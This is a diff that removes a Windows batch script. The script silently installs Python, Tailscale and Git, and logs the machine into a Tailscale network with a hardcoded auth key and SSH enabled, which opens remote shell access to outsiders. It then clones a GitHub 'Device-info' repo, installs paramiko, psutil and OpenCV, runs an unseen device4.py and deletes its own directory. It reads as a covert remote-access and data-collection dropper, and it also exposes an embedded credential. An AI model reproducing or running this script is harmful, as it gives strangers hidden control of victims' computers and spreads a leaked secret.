@ -1,61 +0,0 @@
@echo off

:CHECK_PYTHON
where python >nul 2>nul
if %ERRORLEVEL% NEQ 0 (
    echo [*] Python not found. Installing Python...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.10.6/python-3.10.6-amd64.exe' -OutFile 'python-installer.exe'"
    start /wait python-installer.exe /quiet InstallAllUsers=1 PrependPath=1
    del python-installer.exe
)

:CHECK_TAILSCALE
where tailscale >nul 2>nul
if %ERRORLEVEL% NEQ 0 (
    echo [*] Tailscale not found. Installing Tailscale...
    powershell -Command "Invoke-WebRequest -Uri 'https://pkgs.tailscale.com/stable/tailscale-setup.exe' -OutFile 'tailscale-setup.exe'"
    start /wait tailscale-setup.exe /quiet
    del tailscale-setup.exe
)

:START_TAILSCALE
echo [*] Starting and logging into Tailscale using Auth Key...
tailscale up --authkey tskey-auth-kUU5ZKrmid11CNTRL-tsTWq7PrzaSiaA5peBcfaSE2pTgSamjZU --ssh

:CHECK_GIT
where git >nul 2>nul
if %ERRORLEVEL% NEQ 0 (
    echo [*] Git not found. Installing Git...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/git-for-windows/git/releases/download/v2.42.0.windows.1/Git-2.42.0-64-bit.exe' -OutFile 'git-setup.exe'"
    start /wait git-setup.exe /silent
    del git-setup.exe
)

:CLONE_REPO
set CLONE_DIR=Device-info
if not exist "%CLONE_DIR%" (
    echo [*] Cloning the Device-info repository...
    git clone https://github.com/uchihasosuke/Device-info.git %CLONE_DIR%
)

:INSTALL_PACKAGES
cd %CLONE_DIR%

python -m pip install --upgrade pip
python -m pip install paramiko psutil opencv-python-headless socket uuid datetime re getpass

:RUN_SCRIPT
echo [*] Running the device4.py script...
python device4.py

:LOGOUT_TAILSCALE
echo [*] Logging out of Tailscale...
tailscale down

:DELETE_DIR
echo [*] Deleting the entire script directory...
cd ..
rmdir /s /q "%~dp0"

echo [*] Directory deleted. Script execution completed successfully.
exit